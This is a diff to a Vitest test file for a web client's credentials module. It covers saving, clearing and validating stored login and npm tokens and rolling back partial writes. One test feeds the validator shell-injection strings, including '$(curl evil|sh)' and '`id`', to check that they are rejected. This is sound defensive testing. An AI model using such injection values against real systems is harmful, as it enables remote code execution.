@@ -3,14 +3,27 @@
  *
  * This module uses localStorage — we mock it via vi.stubGlobal.
  */
-import { beforeEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
-import { parseJwt } from "@/client/credentials";
+import {
+  clearCredentials,
+  getNPMToken,
+  isLoggedIn,
+  isOpenIDLoggedIn,
+  isUITokenExpired,
+  isValidCredentials,
+  parseJwt,
+  saveCredentials,
+} from "@/client/credentials";
 
 /** Build an unsigned token whose payload is `payload`. */
 function tokenWith(payload: Record<string, unknown>): string {
   return `header.${Buffer.from(JSON.stringify(payload)).toString("base64url")}.signature`;
 }
+
+afterEach(() => {
+  vi.unstubAllGlobals();
+});
 
 describe("credentials", () => {
   let store: Record<string, string>;
@@ -35,9 +48,22 @@ describe("credentials", () => {
   });
 
   describe("saveCredentials", () => {
-    it("should save username, uiToken and npmToken to localStorage", async () => {
-      const { saveCredentials } = await import("@/client/credentials");
+    function failSecondWrite() {
+      let calls = 0;
+      vi.stubGlobal("localStorage", {
+        getItem: (key: string) => store[key] ?? null,
+        setItem: (key: string, value: string) => {
+          calls += 1;
+          if (calls === 2) throw new Error("quota exceeded");
+          store[key] = value;
+        },
+        removeItem: (key: string) => {
+          delete store[key];
+        },
+      });
+    }
 
+    it("should save username, uiToken and npmToken to localStorage", () => {
       saveCredentials({
         username: "testuser",
         uiToken: "ui-token-123",
@@ -49,28 +75,12 @@ describe("credentials", () => {
       expect(store.npm).toBe("npm-token-456");
     });
 
-    it("should roll back a partial write and keep the previous session", async () => {
+    it("should roll back a partial write and keep the previous session", () => {
       store.username = "old-user";
       store.token = "old-ui";
       store.npm = "old-npm";
 
-      let calls = 0;
-
-      vi.stubGlobal("localStorage", {
-        getItem: (key: string) => store[key] ?? null,
-        setItem: (key: string, value: string) => {
-          calls += 1;
-
-          if (calls === 2) throw new Error("quota exceeded");
-
-          store[key] = value;
-        },
-        removeItem: (key: string) => {
-          delete store[key];
-        },
-      });
-
-      const { saveCredentials } = await import("@/client/credentials");
+      failSecondWrite();
 
       expect(() => saveCredentials({ username: "new-user", uiToken: "new-ui", npmToken: "new-npm" })).toThrow(
         "quota exceeded",
@@ -78,24 +88,8 @@ describe("credentials", () => {
       expect(store).toEqual({ username: "old-user", token: "old-ui", npm: "old-npm" });
     });
 
-    it("should remove the keys it wrote when there was no previous session", async () => {
-      let calls = 0;
-
-      vi.stubGlobal("localStorage", {
-        getItem: (key: string) => store[key] ?? null,
-        setItem: (key: string, value: string) => {
-          calls += 1;
-
-          if (calls === 2) throw new Error("quota exceeded");
-
-          store[key] = value;
-        },
-        removeItem: (key: string) => {
-          delete store[key];
-        },
-      });
-
-      const { saveCredentials } = await import("@/client/credentials");
+    it("should remove the keys it wrote when there was no previous session", () => {
+      failSecondWrite();
 
       expect(() => saveCredentials({ username: "new-user", uiToken: "new-ui", npmToken: "new-npm" })).toThrow(
         "quota exceeded",
@@ -106,9 +100,7 @@ describe("credentials", () => {
   });
 
   describe("clearCredentials", () => {
-    it("should remove all stored credentials", async () => {
-      const { saveCredentials, clearCredentials } = await import("@/client/credentials");
-
+    it("should remove all stored credentials", () => {
       saveCredentials({ username: "testuser", uiToken: "t1", npmToken: "t2" });
       expect(store.username).toBe("testuser");
 
@@ -121,25 +113,21 @@ describe("credentials", () => {
   });
 
   describe("isLoggedIn", () => {
-    it("should return false when no credentials are stored", async () => {
-      const { isLoggedIn } = await import("@/client/credentials");
+    it("should return false when no credentials are stored", () => {
       expect(isLoggedIn()).toBe(false);
     });
 
-    it("should return false when only username is stored", async () => {
-      const { isLoggedIn } = await import("@/client/credentials");
+    it("should return false when only username is stored", () => {
       store.username = "testuser";
       expect(isLoggedIn()).toBe(false);
     });
 
-    it("should return false when only uiToken is stored", async () => {
-      const { isLoggedIn } = await import("@/client/credentials");
+    it("should return false when only uiToken is stored", () => {
       store.token = "ui-token";
       expect(isLoggedIn()).toBe(false);
     });
 
-    it("should return true when both username and uiToken are stored", async () => {
-      const { isLoggedIn } = await import("@/client/credentials");
+    it("should return true when both username and uiToken are stored", () => {
       store.username = "testuser";
       store.token = "ui-token";
       expect(isLoggedIn()).toBe(true);
@@ -147,20 +135,17 @@ describe("credentials", () => {
   });
 
   describe("isOpenIDLoggedIn", () => {
-    it("should return false when no credentials are stored", async () => {
-      const { isOpenIDLoggedIn } = await import("@/client/credentials");
+    it("should return false when no credentials are stored", () => {
       expect(isOpenIDLoggedIn()).toBe(false);
     });
 
-    it("should return false when only partial credentials are stored", async () => {
-      const { isOpenIDLoggedIn } = await import("@/client/credentials");
+    it("should return false when only partial credentials are stored", () => {
       store.username = "testuser";
       store.token = "ui-token";
       expect(isOpenIDLoggedIn()).toBe(false);
     });
 
-    it("should return true when all credentials are stored", async () => {
-      const { isOpenIDLoggedIn } = await import("@/client/credentials");
+    it("should return true when all credentials are stored", () => {
       store.username = "testuser";
       store.token = "ui-token";
       store.npm = "npm-token";
@@ -169,86 +154,71 @@ describe("credentials", () => {
   });
 
   describe("getNPMToken", () => {
-    it("should return null when no npm token is stored", async () => {
-      const { getNPMToken } = await import("@/client/credentials");
+    it("should return null when no npm token is stored", () => {
       expect(getNPMToken()).toBeNull();
     });
 
-    it("should return the npm token when stored", async () => {
-      const { getNPMToken } = await import("@/client/credentials");
+    it("should return the npm token when stored", () => {
       store.npm = "npm-token-789";
       expect(getNPMToken()).toBe("npm-token-789");
     });
   });
 
   describe("isUITokenExpired", () => {
-    it("should return true when no ui token is stored", async () => {
-      const { isUITokenExpired } = await import("@/client/credentials");
+    it("should return true when no ui token is stored", () => {
       expect(isUITokenExpired()).toBe(true);
     });
 
-    it("should return true when the stored value is not a token", async () => {
+    it("should return true when the stored value is not a token", () => {
       store.token = "invalid-token";
-      const { isUITokenExpired } = await import("@/client/credentials");
       expect(isUITokenExpired()).toBe(true);
     });
 
-    it("should return true when token is expired", async () => {
+    it("should return true when token is expired", () => {
       // exp in seconds, set to 30 seconds ago
       store.token = tokenWith({ exp: Math.floor(Date.now() / 1000) - 30 });
-      const { isUITokenExpired } = await import("@/client/credentials");
       expect(isUITokenExpired()).toBe(true);
     });
 
-    it("should return true when token expires within 30 seconds", async () => {
+    it("should return true when token expires within 30 seconds", () => {
       // exp in seconds, set to 20 seconds from now (within the 30s buffer)
       store.token = tokenWith({ exp: Math.floor(Date.now() / 1000) + 20 });
-      const { isUITokenExpired } = await import("@/client/credentials");
       expect(isUITokenExpired()).toBe(true);
     });
 
-    it("should return false when token is not expired", async () => {
+    it("should return false when token is not expired", () => {
       // exp in seconds, set to 1 hour from now
       store.token = tokenWith({ exp: Math.floor(Date.now() / 1000) + 3600 });
-      const { isUITokenExpired } = await import("@/client/credentials");
       expect(isUITokenExpired()).toBe(false);
     });
   });
 
   describe("isValidCredentials", () => {
-    it("should return true for valid credentials", async () => {
-      const { isValidCredentials } = await import("@/client/credentials");
+    it("should return true for valid credentials", () => {
       expect(isValidCredentials({ username: "test", uiToken: "ui", npmToken: "npm" })).toBe(true);
     });
 
-    it("should return false when username is missing", async () => {
-      const { isValidCredentials } = await import("@/client/credentials");
+    it("should return false when username is missing", () => {
       expect(isValidCredentials({ uiToken: "ui", npmToken: "npm" })).toBe(false);
     });
 
-    it("should return false when uiToken is missing", async () => {
-      const { isValidCredentials } = await import("@/client/credentials");
+    it("should return false when uiToken is missing", () => {
       expect(isValidCredentials({ username: "test", npmToken: "npm" })).toBe(false);
     });
 
-    it("should return false when npmToken is missing", async () => {
-      const { isValidCredentials } = await import("@/client/credentials");
+    it("should return false when npmToken is missing", () => {
       expect(isValidCredentials({ username: "test", uiToken: "ui" })).toBe(false);
     });
 
-    it("should return false for empty object", async () => {
-      const { isValidCredentials } = await import("@/client/credentials");
+    it("should return false for empty object", () => {
       expect(isValidCredentials({})).toBe(false);
     });
 
-    it("should return false when all fields are empty strings", async () => {
-      const { isValidCredentials } = await import("@/client/credentials");
+    it("should return false when all fields are empty strings", () => {
       expect(isValidCredentials({ username: "", uiToken: "", npmToken: "" })).toBe(false);
     });
 
-    it("should accept a JWT and a base64url token", async () => {
-      const { isValidCredentials } = await import("@/client/credentials");
-
+    it("should accept a JWT and a base64url token", () => {
       expect(
         isValidCredentials({
           username: "test",
@@ -258,17 +228,14 @@ describe("credentials", () => {
       ).toBe(true);
     });
 
-    it("should reject a token that carries shell metacharacters", async () => {
-      const { isValidCredentials } = await import("@/client/credentials");
-
-      for (const npmToken of ["$(curl evil|sh)", "`id`", "a'b", 'a"b', "a b", "a;b"]) {
+    it.each(["$(curl evil|sh)", "`id`", "a'b", 'a"b', "a b", "a;b"])(
+      "should reject a token that carries shell metacharacters: %s",
+      (npmToken) => {
         expect(isValidCredentials({ username: "test", uiToken: "ui", npmToken })).toBe(false);
-      }
-    });
+      },
+    );
 
-    it("should reject a token longer than the limit", async () => {
-      const { isValidCredentials } = await import("@/client/credentials");
-
+    it("should reject a token longer than the limit", () => {
       expect(isValidCredentials({ username: "test", uiToken: "ui", npmToken: "a".repeat(4097) })).toBe(false);
     });
   });
